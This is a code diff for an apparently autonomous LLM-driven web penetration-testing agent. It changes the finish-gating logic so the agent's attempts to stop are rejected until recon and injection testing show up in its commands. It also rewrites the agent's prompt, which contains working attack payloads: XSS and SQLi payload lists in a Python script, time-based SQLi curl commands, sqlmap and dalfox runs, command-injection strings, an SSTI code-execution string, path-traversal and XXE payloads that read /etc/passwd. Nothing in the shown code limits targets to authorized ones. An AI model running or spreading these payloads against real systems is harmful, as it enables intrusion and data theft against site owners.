@@ -324,10 +324,97 @@ func (a *Agent) Run(targets []string, instruction string) {
 		return total
 	}
 
-	minIterationsBeforeFinish := 35
 	consecutiveErrors := 0
 	emptyResponseCount := 0
-	finishAttempts := 0 // Track how many times LLM tried to finish
+	finishAttempts := 0      // Track how many times LLM tried to finish
+	terminalCalls := 0       // terminal_execute count
+	uniqueToolsUsed := map[string]bool{} // track distinct tool types used
+	reconDone := false       // set true when recon-like commands detected
+	injectionTested := false // set true when injection testing detected
+	scannerUsed := false     // set true when nuclei/sqlmap/dalfox/ffuf used (optional, not required)
+
+	// Smart finish evaluation: decides if the agent has done enough work
+	canFinish := func(iter int) (bool, string) {
+		// Discovery mode (Phase 1 enumeration): always allow finish
+		if a.discoveryMode {
+			return true, ""
+		}
+
+		// Absolute minimum: at least 3 iterations (sanity floor)
+		if iter < 3 {
+			return false, fmt.Sprintf("Only %d iterations completed. Run at least basic recon before finishing.", iter+1)
+		}
+
+		// If agent has done very little (< 5 terminal commands), reject
+		if terminalCalls < 5 {
+			return false, fmt.Sprintf("Only %d commands executed. You haven't done enough testing. Run port scanning, directory brute-forcing, and parameter testing before finishing.", terminalCalls)
+		}
+
+		// If recon wasn't done, reject
+		if !reconDone {
+			return false, "No reconnaissance detected. You must at least run: port scanning (nmap), directory discovery (ffuf/gobuster), and technology fingerprinting (whatweb/curl -sI) before finishing."
+		}
+
+		// After basic threshold, evaluate work quality
+		// Low bar: recon done + some testing + 10+ commands = acceptable early finish
+		// (this handles duplicate subdomains that serve the same content)
+		if terminalCalls >= 10 && reconDone {
+			// If < 15 iters, only allow if the agent did at least some manual injection testing
+			if iter < 15 && !injectionTested {
+				return false, "Recon is done but you haven't tested any parameters for vulnerabilities yet. Manually test discovered endpoints for SQLi, XSS, SSRF, IDOR (curl with special characters, check responses) before finishing."
+			}
+			return true, ""
+		}
+
+		// Generous allowance after 20 iterations regardless
+		if iter >= 20 {
+			return true, ""
+		}
+
+		// Between 10-20 iterations with < 10 commands: nudge to do more
+		missing := []string{}
+		if !injectionTested {
+			missing = append(missing, "manual parameter testing (curl with special chars, check reflections, test SQLi/XSS)")
+		}
+		if len(missing) > 0 {
+			return false, fmt.Sprintf("Still missing: %s. Continue testing before finishing.", strings.Join(missing, ", "))
+		}
+
+		return true, ""
+	}
+
+	// Track work done from tool calls
+	trackWork := func(toolName string, toolArgs map[string]string) {
+		uniqueToolsUsed[toolName] = true
+		if toolName == "terminal_execute" {
+			terminalCalls++
+			cmd := strings.ToLower(toolArgs["command"])
+			// Detect recon commands
+			if strings.Contains(cmd, "nmap") || strings.Contains(cmd, "whatweb") ||
+				strings.Contains(cmd, "curl -si") || strings.Contains(cmd, "curl -sk") ||
+				strings.Contains(cmd, "httpx") || strings.Contains(cmd, "wappalyzer") ||
+				strings.Contains(cmd, "ffuf") || strings.Contains(cmd, "gobuster") ||
+				strings.Contains(cmd, "dirsearch") || strings.Contains(cmd, "katana") ||
+				strings.Contains(cmd, "gospider") || strings.Contains(cmd, "wafw00f") {
+				reconDone = true
+			}
+			// Detect injection testing
+			if strings.Contains(cmd, "sqlmap") || strings.Contains(cmd, "dalfox") ||
+				strings.Contains(cmd, "sleep(") || strings.Contains(cmd, "alert(") ||
+				strings.Contains(cmd, "<script>") || strings.Contains(cmd, "' or ") ||
+				strings.Contains(cmd, "' and ") || strings.Contains(cmd, "{{7*7}}") ||
+				strings.Contains(cmd, "etc/passwd") || strings.Contains(cmd, "xalg0r1x") {
+				injectionTested = true
+			}
+			// Detect scanner usage
+			if strings.Contains(cmd, "nuclei") || strings.Contains(cmd, "sqlmap") ||
+				strings.Contains(cmd, "dalfox") || strings.Contains(cmd, "ffuf") ||
+				strings.Contains(cmd, "gobuster") ||
+				strings.Contains(cmd, "wpscan") || strings.Contains(cmd, "joomscan") {
+				scannerUsed = true
+			}
+		}
+	}
 
 	for iter := 0; (a.maxIter == 0 || iter < a.maxIter) && !a.stopped.Load() && (a.ctx == nil || a.ctx.Err() == nil); iter++ {
 		// Reset activity watchdog on each iteration — IMMEDIATELY, no delay
@@ -429,6 +516,9 @@ Call a tool NOW in your next response.`
 				break
 			}
 
+			// Track work before execution
+			trackWork(tc.Name, tc.Args)
+
 			a.emit(Event{
 				Type:     "tool_call",
 				ToolName: tc.Name,
@@ -450,37 +540,30 @@ Call a tool NOW in your next response.`
 
 			if tc.Name == "finish" || (result.Metadata != nil && result.Metadata["finished"] == true) {
 				finishAttempts++
-				if !a.discoveryMode && iter < minIterationsBeforeFinish {
-					rejectMsg := fmt.Sprintf(`⚠️ FINISH REJECTED — You are only on iteration %d/%d minimum.
-
-You have NOT completed a thorough assessment. You MUST continue testing:
-- Did you run port scanning (nmap)? 
-- Did you run directory brute-forcing (ffuf/dirsearch)?
-- Did you test for SQLi, XSS, SSRF, IDOR on discovered endpoints?
-- Did you analyze JavaScript files for hidden APIs?
-- Did you test authentication and authorization?
-- Did you check for known CVEs in discovered technologies?
-
-DO NOT call finish again until you have thoroughly tested the target.
-Continue with the NEXT PHASE of testing NOW.`, iter+1, minIterationsBeforeFinish)
+				allowed, reason := canFinish(iter)
+				if !allowed {
+					rejectMsg := fmt.Sprintf("⚠️ FINISH REJECTED — %s\n\nDO NOT call finish again until you have done more testing.\nContinue with the NEXT PHASE of testing NOW.", reason)
 					a.emit(Event{Type: "tool_result", ToolName: "finish", ToolResult: tools.Result{Output: rejectMsg}, TotalTokens: tokenCount()})
 					a.msgMu.Lock()
 					a.messages = append(a.messages, llm.Message{Role: "user", Content: rejectMsg})
 					a.msgMu.Unlock()
 					continue
 				}
-				// Allow finish if past minimum, but nudge on first attempt when < 50 iterations
-				if !a.discoveryMode && finishAttempts == 1 && iter < 50 {
-					nudgeMsg := `⚠️ Are you SURE you want to finish? You still have capacity to test more.
+				// First finish attempt: nudge to reconsider if < 20 iterations
+				if finishAttempts == 1 && iter < 20 && !a.discoveryMode {
+					scannerNote := ""
+					if !scannerUsed {
+						scannerNote = "\n- You haven't used any automated scanners (nuclei/ffuf) yet — consider running them on promising endpoints"
+					}
+					nudgeMsg := fmt.Sprintf(`⚠️ Are you SURE you want to finish? You still have capacity to test more.
 
 Before finishing, verify you have covered:
-- All discovered endpoints and parameters
+- All discovered endpoints and parameters tested MANUALLY
 - Common vulnerability classes (SQLi, XSS, SSRF, IDOR, broken auth)
 - Technology-specific CVEs
-- API endpoints found in JavaScript files
-- Authentication bypass attempts
+- API endpoints found in JavaScript files%s
 
-If you have truly covered everything, call finish again. Otherwise, continue testing.`
+If you have truly covered everything, call finish again. Otherwise, continue testing.`, scannerNote)
 					a.emit(Event{Type: "tool_result", ToolName: "finish", ToolResult: tools.Result{Output: nudgeMsg}, TotalTokens: tokenCount()})
 					a.msgMu.Lock()
 					a.messages = append(a.messages, llm.Message{Role: "user", Content: nudgeMsg})
@@ -807,7 +890,8 @@ Then continue with other work while it runs. Check status with:
 <parameter=agent_id>the_id_returned</parameter>
 </function>
 
-USE THIS for: nmap full scans, directory brute-forcing, nuclei scans, sqlmap, and other slow tasks.
+USE THIS for: nmap scans, directory brute-forcing (ffuf/gobuster), nuclei scans, and other slow reconnaissance tasks.
+NOTE: Prefer MANUAL testing (curl, python scripts) over automated scanners for vulnerability discovery.
 
 ## Available Tools
 %s
@@ -1048,30 +1132,46 @@ whois TARGET | grep -iE "org|admin|tech|name|email|phone|address|registrar|creat
 
 ---
 
-### PHASE 2: Vulnerability Scanning (Automated)
-**DO NOT SKIP THIS PHASE - Run ALL vulnerability scanners!**
-**MUST COMPLETE FULLY - Run nuclei on ALL discovered endpoints, not just the main domain!**
+### PHASE 2: Manual Vulnerability Discovery (MANDATORY BEFORE ANY SCANNER)
+**DO NOT run automated scanners yet. Understand the target first.**
+
+For EACH endpoint/URL discovered in Phase 1:
+
 ` + "`" + `bash` + "`" + `
-# Nuclei DAST — comprehensive web vulnerability scanning
-nuclei -u https://TARGET -dast -severity critical,high,medium,low -o ./nuclei_dast.txt -stats -rl 50
+# 1. Send a baseline request and study the response
+curl -sk "https://TARGET/endpoint?param=normalvalue" -o /tmp/baseline.txt
+wc -c /tmp/baseline.txt
+cat /tmp/baseline.txt | head -50
 
-# Nuclei — run with ALL relevant templates (fallback if -dast not supported)
-nuclei -u https://TARGET -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -t default-logins/ -t technologies/ -severity critical,high,medium,low -o ./nuclei_full.txt -stats -rl 50
+# 2. Test how the target handles special characters
+curl -sk "https://TARGET/endpoint?param=test'\"<>(){}" -o /tmp/special.txt
+diff <(wc -c /tmp/baseline.txt) <(wc -c /tmp/special.txt)  # Different size = interesting
 
-# If subdomains found:
-nuclei -l ./live_hosts.txt -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -severity critical,high,medium -o ./nuclei_subs.txt -stats -rl 30
+# 3. Check if input is reflected in the response
+curl -sk "https://TARGET/endpoint?param=XALG0R1XTEST" | grep -c "XALG0R1XTEST"
 
-# Nmap vuln scripts
-nmap --script vuln -p 80,443,8080,8443 TARGET -oN ./nmap_vuln.txt
+# 4. Test for SQL errors with a single quote
+curl -sk "https://TARGET/endpoint?param='" | grep -iE "sql|syntax|mysql|postgres|oracle|error"
+
+# 5. Test time-based behavior
+time curl -sk "https://TARGET/endpoint?param=1' AND SLEEP(3)--" > /dev/null
+time curl -sk "https://TARGET/endpoint?param=1" > /dev/null
+
+# 6. Test for SSTI
+curl -sk "https://TARGET/endpoint?param={{7*7}}" | grep "49"
 ` + "`" + `
 
-**AFTER SCANNING**: Review every nuclei/nmap finding. 
+**AFTER MANUAL TESTING**: You may optionally run nuclei as a SUPPLEMENT (not replacement):
+` + "`" + `bash` + "`" + `
+# Nuclei — run ONLY after manual testing, treat results as leads to verify manually
+nuclei -u https://TARGET -severity critical,high,medium -rl 100 -o ./nuclei_results.txt -stats
+` + "`" + `
 
-**IMPORTANT: Verify before reporting:**
-- Nuclei often reports FALSE POSITIVES
-- Test EACH finding MANUALLY to verify it's exploitable
-- Only report if you can demonstrate a working PoC
-- If only detected by tool but not exploitable → mark as INFO in notes, NOT as vulnerability
+**CRITICAL: DO NOT trust scanner results blindly.**
+- Nuclei findings MUST be manually verified before reporting
+- Any scanner-only finding without manual exploitation proof = REJECTED
+- Focus 80% of your time on MANUAL testing, 20% on scanners
+- If only detected by tool but not manually exploitable → mark as INFO in notes, NOT as vulnerability
 
 ---
 
@@ -1206,42 +1306,115 @@ if header.get('alg') == 'none': print('[VULN] Algorithm none accepted!')
 
 ---
 
-### PHASE 6: Injection Testing — EVERY parameter
-**CRITICAL: Test EVERY parameter you discovered in Phase 1.**
+### PHASE 6: Injection Testing — MANUAL FIRST, THEN AUTOMATE
+**CRITICAL: You MUST test parameters MANUALLY before running sqlmap/dalfox.**
+**Never blindly run automated scanners — understand how the target processes input first.**
+
+#### Step 6A: Manual Parameter Analysis (MANDATORY)
+For EACH discovered endpoint with parameters:
 
 ` + "`" + `bash` + "`" + `
-# SQLi — test all params from wayback/crawl
-sqlmap -m ./urls_with_params.txt --batch --level=5 --risk=3 --threads=10 --random-agent --tamper=space2comment,between --dbs --output-dir=./sqlmap/ 2>/dev/null
+# 1. Send a BASELINE request to understand normal behavior
+curl -sk "https://TARGET/page?param=normalvalue" -o /tmp/baseline.txt
+wc -c /tmp/baseline.txt  # Note response size
 
-# XSS — test all params
-cat ./urls_with_params.txt | dalfox pipe --silence -o ./dalfox_xss.txt 2>/dev/null
+# 2. Test how the target handles special characters
+curl -sk "https://TARGET/page?param=test'\"<>(){}" -o /tmp/special.txt
+wc -c /tmp/special.txt  # Compare size — different = interesting
 
-# Or manual XSS testing per endpoint:
+# 3. Check if input is REFLECTED in the response
+curl -sk "https://TARGET/page?param=XALG0R1XTEST" | grep -c "XALG0R1XTEST"
+# If reflected → potential XSS. Check encoding:
+curl -sk "https://TARGET/page?param=<script>" | grep -o '&lt;script&gt;\|<script>'
+
+# 4. Test for SQL error messages with single quote
+curl -sk "https://TARGET/page?param='" | grep -iE "sql|syntax|mysql|postgres|oracle|sqlite|error|warning|exception"
+
+# 5. Test for time-based behavior (SQLi indicator)
+time curl -sk "https://TARGET/page?param=1' AND SLEEP(3)--" > /dev/null
+time curl -sk "https://TARGET/page?param=1" > /dev/null
+# Compare times — 3+ second difference = SQLi confirmed
+
+# 6. Test numeric params differently
+curl -sk "https://TARGET/page?id=1" -o /tmp/id1.txt
+curl -sk "https://TARGET/page?id=2-1" -o /tmp/id_arith.txt
+diff /tmp/id1.txt /tmp/id_arith.txt  # Same response = arithmetic SQLi
+
+# 7. Check for template injection
+curl -sk "https://TARGET/page?param={{7*7}}" | grep "49"
+curl -sk "https://TARGET/page?param=\${7*7}" | grep "49"
 ` + "`" + `
+
+#### Step 6B: Detailed Manual Testing per Vulnerability Class
+**Only proceed here for parameters that showed interesting behavior in Step 6A.**
+
 ` + "`" + `python` + "`" + `
 import requests, urllib.parse
-xss = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>',
-       '"><script>alert(1)</script>', "'-alert(1)-'", '${alert(1)}', '{{7*7}}',
-       'javascript:alert(1)', '<details/open/ontoggle=alert(1)>',
-       '\x3cscript\x3ealert(1)\x3c/script\x3e']
-# Test each discovered parameter
-for payload in xss:
+requests.packages.urllib3.disable_warnings()
+
+target_url = "https://TARGET/page"
+param_name = "PARAM"
+
+# --- XSS: Only test if parameter is REFLECTED ---
+xss_payloads = [
+    '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
+    '"><script>alert(1)</script>', "'-alert(1)-'",
+    '<svg/onload=alert(1)>', '<details/open/ontoggle=alert(1)>',
+    '{{7*7}}', '${alert(1)}'
+]
+for p in xss_payloads:
     try:
-        r = requests.get(f'https://TARGET/?q={urllib.parse.quote(payload)}', verify=False, timeout=5)
-        if payload.replace(urllib.parse.quote(payload), payload) in r.text or '{{49}}' in r.text:
-            print(f'[VULN] Reflected XSS: {payload}')
-    except: pass
+        r = requests.get(f"{target_url}?{param_name}={urllib.parse.quote(p)}",
+                        verify=False, timeout=10)
+        # Check if payload appears UNENCODED in response
+        if p in r.text or (p == '{{7*7}}' and '49' in r.text):
+            print(f"[POTENTIAL XSS] Payload reflected unencoded: {p}")
+            print(f"  Status: {r.status_code}, Content-Type: {r.headers.get('Content-Type')}")
+    except Exception as e:
+        print(f"Error: {e}")
+
+# --- SQLi: Only test if single quote caused errors ---
+sqli_payloads = [
+    ("' OR '1'='1", "Boolean-based"), ("' AND '1'='2", "Boolean-based"),
+    ("1 UNION SELECT NULL--", "UNION"), ("1 UNION SELECT NULL,NULL--", "UNION"),
+    ("' AND SLEEP(5)--", "Time-based"), ("'; WAITFOR DELAY '0:0:5'--", "Time-based"),
+    ("1; SELECT pg_sleep(5)--", "Time-based PostgreSQL"),
+]
+import time
+for payload, sqli_type in sqli_payloads:
+    try:
+        start = time.time()
+        r = requests.get(f"{target_url}?{param_name}={urllib.parse.quote(payload)}",
+                        verify=False, timeout=15)
+        elapsed = time.time() - start
+        if sqli_type == "Time-based" and elapsed > 4:
+            print(f"[CONFIRMED SQLi] Time-based: {payload} (took {elapsed:.1f}s)")
+        elif "sql" in r.text.lower() or "syntax" in r.text.lower() or "error" in r.text.lower():
+            print(f"[POTENTIAL SQLi] Error-based: {payload}")
+            print(f"  Response snippet: {r.text[:200]}")
+    except Exception as e:
+        print(f"Error: {e}")
 ` + "`" + `
 
+#### Step 6C: Automated Scanner (ONLY after manual confirmation)
+**Use sqlmap/dalfox ONLY on parameters that showed vulnerability indicators in Steps 6A/6B.**
+
 ` + "`" + `bash` + "`" + `
-# Command injection tests
+# SQLi — ONLY on URLs where manual testing showed SQL errors or time delays
+# DO NOT run sqlmap on all URLs blindly
+sqlmap -u "https://TARGET/page?param=value" --batch --level=3 --risk=2 --random-agent --threads=5 --output-dir=./sqlmap/ 2>/dev/null
+
+# XSS — ONLY on URLs where manual testing showed reflection
+echo "https://TARGET/page?param=test" | dalfox pipe --silence -o ./dalfox_xss.txt 2>/dev/null
+
+# Command injection tests (manual first)
 # Test params with: ;id, |id, $(id), ` + "`" + `id` + "`" + `, ; sleep 10, | sleep 10
 
-# Template injection (SSTI)
-# Test params with: {{7*7}}, ${7*7}, #{7*7}, {{config}}, {{self.__class__.__mro__}}
+# Template injection (SSTI) — only if {{7*7}} returned 49
+# Test with: {{config}}, {{self.__class__.__mro__}}, ${T(java.lang.Runtime).getRuntime().exec("id")}
 
 # Path traversal
-# Test params with: ../../../etc/passwd, ....//....//etc/passwd, ..%2f..%2fetc%2fpasswd, /etc/passwd%00
+# Test params with: ../../../etc/passwd, ....//....//etc/passwd, ..%2f..%2fetc%2fpasswd
 
 # XXE (if XML input accepted)
 # Test with: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
